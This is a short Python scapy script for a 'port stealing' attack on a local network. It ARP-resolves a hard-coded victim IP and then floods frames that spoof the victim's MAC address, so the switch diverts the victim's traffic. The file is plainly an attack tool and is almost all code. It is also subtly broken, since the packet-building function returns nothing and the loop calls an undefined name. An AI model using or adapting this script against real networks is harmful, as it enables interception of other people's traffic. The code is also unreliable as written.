from scapy.all import *
import time

def get_mac_target(ip_target):
    """ Get the mac address
    """
    arp_bdr = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip_target)
    resp, send = srp(arp_bdr)
    return resp[0][1].hwsrc

def port_stealing(mac_target, ip_target):
    attack_packet = Ether(src=mac_target, dst=RandMAC()) / IP(src=RandIP(),dst=ip_target) / TCP()

try:
    while True:
        victim_ip="172.16.1.130"
        victim_mac = get_mac_target(victim_ip)
        sendp(attack_packet(victim_mac, victim_ip))
        time.sleep(0.1)
except KeyboardInterrupt:
    quit()